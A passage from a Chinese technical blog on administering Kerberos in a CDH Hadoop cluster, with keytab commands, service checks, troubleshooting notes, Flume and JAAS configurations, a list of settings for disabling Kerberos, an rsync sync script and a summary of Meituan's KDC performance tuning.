href="https://docs.huihoo.com/solaris/10/simplified-chinese/html/819-7061/aadmin-3.html#setup-304" target="_blank" rel="noopener">Oracle系统管理指南：安全性服务文档</a></p><p>（包括了备份和传播Kerberos、如何恢复Kerberos、如何在服务器升级后转换Kerberos数据库，如何重新配置主KDC服务器以使用增量传播，如何重新配置从KDC以使用增量传播，如何配置从 KDC 服务器以使用完全传播，如何验证KDC服务器已经同步，如何手动将Kerberos数据库传播到从KDC服务器，设计并行传播，设置并行传播的配置步骤，管理存储文件，如何删除存储文件等。）</p><hr><h3 id="8-对Kerberos的一点使用心得"><a href="#8-对Kerberos的一点使用心得" class="headerlink" title="8.对Kerberos的一点使用心得"></a>8.对Kerberos的一点使用心得</h3><p>CDH的Kerberos其实算是相对好管理的，最起码组件的principal都是CDH自动生成的。</p><p>在KDC上创建完成管理员开启功能之后，我常用的操作有这些：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 登录，通过创建的BDB管理账号管理</span><br><span class="line">kadmin.local</span><br><span class="line"><span class="meta">#</span> 查看现有的账号列表</span><br><span class="line">kadmin.local: listprincs</span><br><span class="line"><span class="meta">#</span> 这边CDH的Principal都是自动生成的，可以直接使用，在服务器上的文件夹里找到对应Keytab就可以登录</span><br><span class="line"><span class="meta">#</span> 找到Principal之后，可以查看Keytab的加密方式 过期时间等等</span><br><span class="line">klist -kt /root/hdfs.keytab</span><br><span class="line">Keytab name: FILE:/root/hdfs.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line">  13 07/03/2018 10:08:10 hdfs/master126@JIMI.COM</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> Keytab的作用就是获取KDC的ticket</span><br><span class="line">kinit -kt keytab/hdfs.keytab hdfs/master126@JIMI.COM</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 还可以使用klist -e查看现在服务器里缓存的是哪一个ticket</span><br><span class="line">klist -e</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_0</span><br><span class="line">Default principal: hdfs/bigdata25@ZQYKJ.COM</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">07/06/2018 11:24:46  07/07/2018 11:24:46  krbtgt/ZQYKJ.COM@ZQYKJ.COM</span><br><span class="line">renew until 07/11/2018 11:24:46, Etype (skey, tkt): aes128-cts-hmac-sha1-96, aes128-cts-hmac-sha1-96 </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 退出</span><br><span class="line">kdestroy</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span> 这边还拓展一个很实用的功能 keytab维护工具 ktutil</span><br><span class="line">ktutil</span><br><span class="line"><span class="meta">#</span> 打开之后即进入工具，工具里面我常用的功能包括：rkt（read keytab）</span><br><span class="line"><span class="meta">#</span> 可以将keytab读进来之后然后，生成新的keytab（合并）</span><br><span class="line"><span class="meta">#</span> 然后上面提到的read完成之后，也可以列出 分析 加密方式等等</span><br></pre></td></tr></table></figure><p><a href="https://www.freebsd.org/cgi/man.cgi?query=ktutil" target="_blank" rel="noopener">更多ktutilAPI</a></p><p><a href="https://www.ibm.com/support/knowledgecenter/zh/ssw_aix_71/com.ibm.aix.cmds3/klist.htm" target="_blank" rel="noopener">IBM对BDB数据库命令的介绍</a></p><hr><h3 id="9-如何验证Kerberos已经安装完成"><a href="#9-如何验证Kerberos已经安装完成" class="headerlink" title="9.如何验证Kerberos已经安装完成"></a>9.如何验证Kerberos已经安装完成</h3><p><strong>HDFS</strong><br>登录到某一个节点后，切换到hdfs用户，然后用kinit来获取credentials</p><p>现在用<code>hadoop hdfs -ls /</code>应该能正常输出结果<br>用kdestroy销毁credentials后，再使用<code>hadoop hdfs -ls /</code>会发现报错</p><p><strong>Kafka</strong></p><p>用新的一套API，消费者能正常消费，生产者能正常生产不报错误就算ok</p><p>注意：是新API，开启Kerberos之后老API无法再使用</p><p><strong>Zookeeper</strong></p><p>启动zookeeper：</p><p>Zookeeper-client -server master:2181</p><p>创建一个 znode 节点：</p><p>create /znode1 sasl:<a href="mailto:master@JIMI.com" target="_blank" rel="noopener">master@JIMI.com</a>:cdwra</p><p>在另外的节点上执行 </p><p>getAcl /znode1</p><p>如果能够获取在另外一个节点上输入的输入就证明没有问题</p><hr><h3 id="10-Kerberos遇到的坑"><a href="#10-Kerberos遇到的坑" class="headerlink" title="10.Kerberos遇到的坑"></a>10.Kerberos遇到的坑</h3><h4 id="Kerberos卸载BUG"><a href="#Kerberos卸载BUG" class="headerlink" title="Kerberos卸载BUG"></a>Kerberos卸载BUG</h4><p>Linux上的KDC存在严重的卸载BUG，使用<code>yum remove</code>卸载会出现严重的问题</p><p>因为之前<code>principal</code>的认证因为人为操作出现了一些问题，所以用yum remove卸载重新安装了一下，yum remove之后出现了大问题，凡是新连接外部的命令都无法使用，包括并不限于：yum、ssh、wgt等命令，FTP工具也无法使用，这就导致了无法连接外部下载kdc安装包</p><p>还好我卸载之前连接的SSH窗口没有关闭（新的连接无法建立， 但是已经建立的连接不会断开），用的XSHELL 6，我尝试用XFTP连接，失败，但是XSHELL 6 默认输入框里就有传输文件的功能，上传四个Kerberos文件之后重新安装之后才解决了问题。</p><h4 id="Zookeeper报错"><a href="#Zookeeper报错" class="headerlink" title="Zookeeper报错"></a>Zookeeper报错</h4><p>Zk这个组件启动的时候在互相连接的装一下会报Error，这个Error曾今困扰了我挺久</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2019-02-26 18:37:15,898 WARN org.apache.zookeeper.server.NIOServerCnxn: caught end of stream exception</span><br><span class="line">EndOfStreamException: Unable to read additional data from client sessionid 0x269290a81950073, likely client has closed socket</span><br><span class="line">        at org.apache.zookeeper.server.NIOServerCnxn.doIO(NIOServerCnxn.java:231)</span><br><span class="line">        at org.apache.zookeeper.server.NIOServerCnxnFactory.run(NIOServerCnxnFactory.java:208)</span><br><span class="line">        at java.lang.Thread.run(Thread.java:748)</span><br></pre></td></tr></table></figure><p>其实只要Zk验证了没有问题就行了，这个报错不用纠结</p><h4 id="Kafka启动-关闭Kerberos的坑"><a href="#Kafka启动-关闭Kerberos的坑" class="headerlink" title="Kafka启动/关闭Kerberos的坑"></a>Kafka启动/关闭Kerberos的坑</h4><p>CDH集群中为Kafka启用Kerberos需要些配置之外的操作，启用Kerberos的时候容易忽略这些细节，导致kafka开启不正确， 然后关闭的时候容易把这些操作忽略了，导致关闭不彻底，在有的环节仍然关闭了Kerberos。</p><p>Kafka在CDH中的配置需要先登录CM进入kafka服务，修改<code>ssl.client.auth</code>为none，这届两个Kerberos相关的配置设为开启，接下来还要修改security.inter.broker.protocol配置为SASL_PLAINTEXT，保存以上修改的配置后，回到主页根据提示重启kafka Server,接下来就是在客户端上的配置，本身CDH就会为了Kafka生成配置文件jaas.conf，对于这个配置文件真实一言难尽，里面的配置文件会有 不起眼的错误（是关于KafkaClient和KafkaServer混淆的错误），这一个改正完毕，还有一个配置文件client.properties文件，两个文件设置完毕后，在<code>/etc/profile</code>里面设置环境变量<code>exportKAFKA_OPTS=&quot;-Djava.security.krb5.conf=/etc/krb5.conf-Djava.security.auth.login.config=/opt/kafka/kafka_client.jaas&quot;</code>，配置完毕kafka这块，关闭的时候容易忘记，必须要记得从profile中删除才行。</p><h4 id="Flume配置文件导致文件无限传输"><a href="#Flume配置文件导致文件无限传输" class="headerlink" title="Flume配置文件导致文件无限传输"></a>Flume配置文件导致文件无限传输</h4><p>Flume的配置文件出了错误，因为对Flume的KafkaChannel的不熟悉</p><p>配置的时候把Channel的sink又连接到Source上导致了数据一致循环。。。</p><p>排查之后发现了这个问题，附上Flume的配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">agent.sources = kafkaSource1</span><br><span class="line">agent.channels = kafkaChannel</span><br><span class="line">agent.sinks = hdfsSink</span><br><span class="line">agent.sources.kafkaSource1.channels = kafkaChannel</span><br><span class="line">agent.sinks.hdfsSink.channel = kafkaChannel</span><br><span class="line"></span><br><span class="line">agent.sources.kafkaSource1.type = org.apache.flume.source.kafka.KafkaSource</span><br><span class="line">agent.sources.kafkaSource1.zookeeperConnect = master126:2181</span><br><span class="line">agent.sources.kafkaSource1.topic = report.alarm,report.distance,report.track,report.acc,report.stop</span><br><span class="line">agent.sources.kafkaSource1.consumer.group.id = cloudera_mirrormaker</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.timeout.ms = 100</span><br><span class="line">agent.sources.kafkaSource1.kafka.bootstrap.servers = master126:9092</span><br><span class="line">agent.sources.kafkaSource1.batchSize = 100</span><br><span class="line">agent.sources.kafkaSource1.batchDurationMillis = 1000</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.sources.kafkaSource1.kafka.consumer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.channels.kafkaChannel.type = org.apache.flume.channel.kafka.KafkaChannel</span><br><span class="line">agent.channels.kafkaChannel.kafka.bootstrap.servers = master126:9092</span><br><span class="line">agent.channels.kafkaChannel.kafka.topic = source_from_kafka</span><br><span class="line">agent.channels.kafkaChannel.consumer.group.id = flume-consumer</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.timeout.ms = 2000</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.channels.kafkaChannel.kafka.producer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.timeout.ms = 2000</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.security.protocol = SASL_PLAINTEXT</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.sasl.mechanism = GSSAPI</span><br><span class="line">agent.channels.kafkaChannel.kafka.consumer.sasl.kerberos.service.name = kafka</span><br><span class="line"></span><br><span class="line">agent.sinks.hdfsSink.type = hdfs</span><br><span class="line">agent.sinks.hdfsSink.hdfs.kerberosKeytab= /hdfs-keytab/hdfs.keytab</span><br><span class="line">agent.sinks.hdfsSink.hdfs.kerberosPrincipal= hdfs@JIMI.COM</span><br><span class="line">agent.sinks.hdfsSink.hdfs.path = hdfs://master126:8020/test/data/flume/kafka/%Y%m%d</span><br><span class="line"><span class="meta">#</span>上传文件的前缀</span><br><span class="line">agent.sinks.hdfsSink.hdfs.filePrefix = %d_%&#123;topic&#125;</span><br><span class="line"><span class="meta">#</span>是否按照时间滚动文件夹</span><br><span class="line">agent.sinks.hdfsSink.hdfs.round = true</span><br><span class="line"><span class="meta">#</span>多少时间单位创建一个新的文件夹</span><br><span class="line">agent.sinks.hdfsSink.hdfs.roundValue = 24</span><br><span class="line"><span class="meta">#</span>重新定义时间单位</span><br><span class="line">agent.sinks.hdfsSink.hdfs.roundUnit = hour</span><br><span class="line"><span class="meta">#</span>是否使用本地时间戳</span><br><span class="line">agent.sinks.hdfsSink.hdfs.useLocalTimeStamp = true</span><br><span class="line"><span class="meta">#</span>积攒多少个Event才flush到HDFS一次</span><br><span class="line">agent.sinks.hdfsSink.hdfs.batchSize = 200</span><br><span class="line"><span class="meta">#</span>设置文件类型，可支持压缩</span><br><span class="line">agent.sinks.hdfsSink.hdfs.fileType = DataStream</span><br><span class="line"><span class="meta">#</span>多久生成一个新的文件</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollInterval = 7200</span><br><span class="line"><span class="meta">#</span>设置每个文件的滚动大小</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollSize = 1073741824</span><br><span class="line"><span class="meta">#</span>文件的滚动与Event数量无关</span><br><span class="line">agent.sinks.hdfsSink.hdfs.rollCount = 0</span><br><span class="line">agent.sinks.hdfsSink.hdfs.writeFormat = TEXT</span><br></pre></td></tr></table></figure><p>例子中的配置文件的最终效果是从kafka的多个topic report.stop等等读取数据之后通过kafka channel，然后根据不同的topic生成不同的文件。</p><h4 id="HUE中Oozie报错，时区错误"><a href="#HUE中Oozie报错，时区错误" class="headerlink" title="HUE中Oozie报错，时区错误"></a>HUE中Oozie报错，时区错误</h4><p>发现HUE的时间和实际时间有偏差，原因是HUE的时区默认是美国，要在配置里面修改，修改成东8区即可</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2w01fhhuuj20wo05bjrg.jpg" alt></p><h4 id="系统自带的无法识别的配置文件"><a href="#系统自带的无法识别的配置文件" class="headerlink" title="系统自带的无法识别的配置文件"></a>系统自带的无法识别的配置文件</h4><p>值得一提的是这边有个错误我花了好久才发现，CDH因为是高度集成的，里面很多配置文件都是自己生成的，像Kafka的Keytab配置文件，文件里面的内容并不正确，里面指定的KafkaClient和Server根本无法识别，更改之后才可以识别。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">KafkaClient &#123;</span><br><span class="line">   com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">   doNotPrompt=true</span><br><span class="line">   useKeyTab=true</span><br><span class="line">   storeKey=true</span><br><span class="line"> keyTab="D:\\kafkaproducer\\KafkaKerberosProducer\\src\\main\\resources\\kafka.keytab"</span><br><span class="line">   principal="kafka/master126@JIMI.COM";</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Client &#123;</span><br><span class="line">   com.sun.security.auth.module.Krb5LoginModule required</span><br><span class="line">   useKeyTab=true</span><br><span class="line">   storeKey=true</span><br><span class="line"> keyTab="D:\\kafkaproducer\\KafkaKerberosProducer\\src\\main\\resources\\kafka.keytab"</span><br><span class="line">   principal="kafka/master126@JIMI.COM";</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><hr><h3 id="11-Windows下访问Kerberos-CDH集群的WebUI界面"><a href="#11-Windows下访问Kerberos-CDH集群的WebUI界面" class="headerlink" title="11.Windows下访问Kerberos CDH集群的WebUI界面"></a>11.Windows下访问Kerberos CDH集群的WebUI界面</h3><p><a href="http://web.mit.edu/kerberos/dist/" target="_blank" rel="noopener">MIT Kerberos下载地址</a></p><p>先安装windows下的Kerberos安装包，无脑安装就行了。</p><p>接着配置krb5..ini文件，将krb5.conf的内容拷贝进来，切忌不要直接更改后缀名就使用</p><p>接着启动MIT Kerberos软件</p><p>使用我们在linux KDC上注册的管理员账号登录即可。我们登录不同的服务使用到的不用的账号，这个软件貌似会通过我们这个管理员账号自己搞定。</p><p>还有一种方法，需要使用Keytab，还涉及到文件权限的问题，因为上面的方法我很轻易就成功访问了WebUI，所以第二种方法就没有尝试。</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzI4OTY3MTUyNg==&amp;mid=2247483853&amp;idx=1&amp;sn=442a8ba87c922857253a437affe42506&amp;chksm=ec2ad1c4db5d58d2933ae5cde4ab1a7443c944e94aca85b51cbd8e9f4f3772162a39074da49d&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">更多内容访问阿里巨佬Fayson的公众号</a></p><hr><h3 id="12-禁用Kerberos需要调整的设置"><a href="#12-禁用Kerberos需要调整的设置" class="headerlink" title="12.禁用Kerberos需要调整的设置"></a>12.禁用Kerberos需要调整的设置</h3><p>说明：设置可能会随着版本变化有所变化</p><p><strong>Zookeeper</strong></p><ul><li><code>enableSecurity (Enable Kerberos Authentication)</code> : false</li><li><code>zoo.cfg</code> 的Server 高级配置代码段（安全阀）写入skipACL: yes</li></ul><p><strong>HDFS</strong></p><ul><li><code>hadoop.security.authentication</code> : Simple</li><li><code>hadoop.security.authorization</code> : false</li><li><code>dfs.datanode.address</code> : 1004 (for Kerberos) 改为 50010 (default)</li><li><code>dfs.datanode.http.address</code> : 1006 (for Kerberos) 改为 50075 (default)</li><li><code>dfs.datanode.data.dir.perm</code> : 700 改为 755</li></ul><p><strong>HBase</strong></p><ul><li><code>hbase.security.authentication</code> : Simple</li><li><code>hbase.security.authorization</code> : false</li><li><code>hbase.thrift.security.qop</code> : none</li></ul><p><strong>Hue</strong></p><ul><li><code>Kerberos Ticket Renewer</code>: 删除或停用角色</li></ul><p><strong>Kafka</strong></p><ul><li><code>kerberos.auth.enable</code>: false</li></ul><p><strong>SOLR</strong></p><ul><li><code>solr Secure Authentication</code> : Simple</li></ul><hr><h3 id="13-集群同步脚本"><a href="#13-集群同步脚本" class="headerlink" title="13.集群同步脚本"></a>13.集群同步脚本</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>!/bin/bash</span><br><span class="line">    #1 获取输入参数个数，如果没有参数，直接退出</span><br><span class="line">    pcount=$#</span><br><span class="line">    if((pcount==0)); then</span><br><span class="line">    echo no args;</span><br><span class="line">    exit;</span><br><span class="line">    fi</span><br><span class="line"></span><br><span class="line">    #2 获取文件名称</span><br><span class="line">    p1=$1</span><br><span class="line">    fname=`basename $p1`</span><br><span class="line">    echo fname=$fname</span><br><span class="line"></span><br><span class="line">    #3 获取上级目录到绝对路径</span><br><span class="line">    pdir=`cd -P $(dirname $p1); pwd`</span><br><span class="line">    echo pdir=$pdir</span><br><span class="line"></span><br><span class="line">    #4 获取当前用户名称</span><br><span class="line">    user=`whoami`</span><br><span class="line"></span><br><span class="line">    #5 循环</span><br><span class="line">    for((host=0; host&lt;2; host++)); do</span><br><span class="line">    echo ------------------- datanode$host --------------</span><br><span class="line">    rsync -rvl $pdir/$fname $user@datanode$host:$pdir</span><br><span class="line">    done</span><br></pre></td></tr></table></figure><p>要先安装rsync</p><p>yum install rsync</p><p>安装成功之后才能用这个同步命令</p><hr><h3 id="14-Kerberos优化"><a href="#14-Kerberos优化" class="headerlink" title="14.Kerberos优化"></a>14.Kerberos优化</h3><h4 id="美团优化实战"><a href="#美团优化实战" class="headerlink" title="美团优化实战"></a>美团优化实战</h4><p><strong>为什么要优化：</strong></p><p>线上单台KDC服务器最大承受QPS是多少？哪台KDC的服务即将出现压力过大的问题？为什么机器的资源非常空闲，KDC的压力却会过大？如何优化？优化后瓶颈在哪儿？如何保证监控指标的全面性、可靠性和准确性？这都是本文需要回答的问题。从本次优化工作达成的最终结果上来看，单台服务器每秒的处理性能提升16倍左右，另外通过共享内存的方式设计了一个获取KDC各项核心指标的接口，使得服务的可用性进一步提升。</p><p>名词：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v66w9mt3j212m0hw75j.jpg" alt></p><p>下图是美团的架构，整个KDC服务都部署在同一个IDC</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v697svjwj21a40zc771.jpg" alt></p><p><strong>主要优化工作</strong></p><p>通过对KDC原理的分析，很容易判断只有前两部分才可能直接给KDC服务带来压力，因此本文涉及到的工作都将围绕上一部分的前两个环节展开分析。本次优化工作采用Grinder这一开源压测工具，分别对AS、TGS两个请求过程，采用相同机型（保证硬件的一致性）在不同场景下进行了压力测试。</p><p>优化之前，线上KDC服务启动的单进程；为最低风险的完成美团和点评数据的融合，KDC中keytab都开启了PREAUTH属性；承载KDC服务的部分服务器没有做RAID。KDC服务出现故障时，机器整体资源空闲，怀疑是单进程的处理能力达到上限；PREAUTH属性进一步保证提升了KDC服务的安全性，但可能带来一定的性能开销；如果线上服务器只加载了少量的keytab信息，那么没有被加载到内存的数据必然读取磁盘，从而带来一定的IO损耗。</p><p>因此本文中，对以下三个条件进行变动，分别进行了测试：</p><ol><li>对承载KDC服务的物理机型是否做RAID10；</li><li>请求的keytab在库中是否带有PRAUTH属性；</li><li>KDC是否启动多进程（多进程设置数目和物理机核数一致）。（实际测试工作中进行了多次测试）</li></ol><p><strong>Client和AS交互过程的压测</strong></p><p>下图为AS压测的一组平均水平的测试数据，使用的物理机有40核，因此多进程测试启动40个进程。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6aqpeh0j212i0gumxq.jpg" alt></p><p>分析表中的数据，很容易提出如下问题从而需要进一步探索：</p><ol><li>比较表中第一行和第二行、第三行和第四行，主机做不做RAID为什么对结果几乎无影响？</li></ol><p>该四组（测试结果为49、53、100和104所在表2中的行）数据均在达到处理能力上限一段时间后产生认证失败，分析机器的性能数据，内存、网卡、磁盘资源均没有成为系统的瓶颈，CPU资源除了某个CPU偶尔被打满，其他均很空闲。分析客户端和服务端的认证日志，服务端未见明显异常，但是客户端发现大量的Socket Timeout错误（测试设置的Socket超时时间为30s）。由于测试过程中，客户端输出的压力始终大于KDC的最大处理能力，导致KDC端的AS始终处于满负荷状态，暂时处理不了的请求必然导致排队；当排队的请求等待时间超过设置的30s后便会开始超时从而认证出错，且伴随机器某一CPU被打满（如图3）。 显然KDC单进程服务的处理能力已经达到瓶颈且瓶颈存在单核CPU的处理能力，从而决定向多进程方向进行优化测试。</p><p>单进程KDC打满某一CPU：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6d08i8dj20xk0cewga.jpg" alt></p><p>下图为本次压力测试的一个通用模型，假设KDC单位时间内的最大处理能力是A，来自客户端的请求速率稳定为B且 B&gt;A ；图中黄色区域为排队的请求数，当某一请求排队超过30s，便会导致Socket Timedout错误。</p><p>AS处理能力和Client压力模型：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6dxwvacj21380pqwg3.jpg" alt></p><ol start="2"><li>比较上上一张表中第1和3行、第2和4行、第7和8行相比，为什么有PREAUTH属性的认证QPS大致是无该属性处理能力的一半？</li></ol><p>如果Client的keytab在KDC的库中不带有PREAUTH这一属性，Client发送请求，KDC的AS模块验证其合法性之后返回正确的结果；整个过程只需要两次建立链接进行交互便可完成。如果带有PREAUTH属性，意味着该keytab的认证启动了Kerberos 5协议中的 pre-authentication概念：当AS模块收到Client的请求信息后；故意给Client返回一个错误的请求包，Client会“领悟到”这是KDC的AS端需要进行提前认证；从而Client获取自己服务器的时间戳并用自己的密钥加密发送KDC，KDC解密后和自身所在服务器的时间进行对比，如果误差在能容忍的范围内；返回给Client正确的TGT响应包；过程如下图所示。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6fxvq1xj220o0d0juw.jpg" alt></p><ol start="3"><li>根据对问题2的分析，CPU占用表中第5和7行的值的比例应该近似为1:2，为什么第5行的值只有115，结果和理论差距如此之大？</li></ol><p>KDC的库中对客户端的keytab开启PREAUTH属性，客户端每认证一次，KDC需要将该次认证的时间戳等信息写到本次磁盘的BDB数据库的Log中；而关闭PREAUTH属性后，每次认证只需要从库中读取数据，只要给BDB数据库分配的内存足够大，就可以最大程度的减少和本次磁盘的交互。KDC40进程且开启PRAUTH，其AS处理能力的QPS只有115，分析机器性能的相关指标，发现瓶颈果然是单盘的IO，如图6所示。使用BDB提供的工具，查看美团数据平台KDC服务的BDB缓存命中率为99%，如下图所示：</p><p>无RAID多KDC进程服务器磁盘IO：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6i16k8hj21140ccgmj.jpg" alt></p><p>美团KDC缓存命中率：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6jctl01j20pa0bw76t.jpg" alt></p><ol start="4"><li>KDC AS处理能力在多进程做RAID条件下，有无preauth属性，KDC服务是否有瓶颈？如果有在哪里？</li></ol><p>经多次实验，KDC的AS处理能力受目前物理机CPU处理能力的限制，图8为有PREAUTH属性的CPU使用情况截图，无PREAUTH结果一致。</p><p>40进程有PREAUTH，AS对CPU资源的使用情况：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6jsf7r8j20z2154qk7.jpg" alt></p><p><strong>Client和TGS交互过程的压测：</strong></p><p>下表为TGS压测的一组平均水平的测试数据：</p><p>TGS压测：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6kt9fnvj212g0h2t9a.jpg" alt></p><p>可以发现KDC对TGS请求的处理能力和主机是否做RAID无关,结合KDC中TGS的请求原理，就较容易理解在BDB缓存命中率足够高的条件下，TGS的请求不需要和本次磁盘交互；进一步做实验，也充分验证了这一点，机器的磁盘IO在整个测试过程中，没有大的变化，如图所示，操作系统本身偶尔产生的IO完全构不成KDC的服务瓶颈。KDC单进程多进程的对比，其处理瓶颈和AS一致，均受到CPU处理能力的限制（单进程打满某一CPU，多进程几乎占用整台机器的CPU资源）。从Kerberos的设计原理分析，很容易理解，无论KDC库中的keytab是否带有PREAUTH属性，对TGS的处理逻辑几乎没有影响，压测的数据结果从实际角度验证了这一点。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6m4az4cj224a0tawhe.jpg" alt></p><p><strong>C：其它问题</strong></p><p>Client和KDC的交互，支持TCP和UDP两种协议。在网络环境良好的情况下，两种协议的KDC的测试结果理论上和实际中几乎一致。但是在原生代码中，使用TCP协议，在客户端给KDC造成一定压力持续6s左右，客户端开始认证出错，在远未达到超时时限的情况下，Client出现了<code>socket reset</code>类的错误。KDC查看内核日志，发现大量<code>possible SYN flooding on port 8089(KDC的服务端口). Sending cookies</code>，且通过<code>netstat -s</code>发现机器的<code>xxxx times the listen queue of a socket overflowed</code>异常增高，种种现象表明可能是服务端的半连接队列、全连接队列中的一个或者全部被打满。主要原理如图10所示：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2v6mjf0tvj20ws0wuq6q.jpg" alt></p><p>发现KDC服务所在服务器：半队列<code>/proc/sys/net/ipv4/tcp_max_syn_backlog为2048</code>。</p><p>全队列：1）系统参数<code>/proc/sys/net/core/somaxconn＝65535</code>，查看代码<code>listen()</code>函数的传入值为5。</p><p>故而判断TCP的瓶颈在于全队列，因此目标为将<code>listen</code>函数的第二个<code>backlog</code>参数变成可控可传入。</p><p><strong>KDC可监控的设计和实现</strong></p><p>开源社区对Kerberos实现的KDC完全没有对外暴露可监控的接口，最初线上的场景主要通过检索Log进行相关指标的监控，在统计服务QPS、各种错误的监控等方面，存在准确准确监控难的尴尬局面。为了实现对KDC准确、较全面的监控，对KDC进行了二次开发，设计一个获取监控指标的接口。对监控的设计，主要从以下三个方面进行了考虑和设计。</p><p><strong>A.设计上的权衡</strong></p><ol><li><p>监控的设计无论在什么场景下，都应该尽可能的不去或者最小程度的影响线上的服务，本文最终采用建立一块共享内存的方式，记录各个KDC进程的打点信息，实现的架构如图11所示。每个KDC进程对应共享内存中的一块区域，通过n个数组来存储KDC n个进程的服务指标：当某个KDC进程处理一个请求后，该请求对监控指标的影响会直接打点更新到其对应的Slot 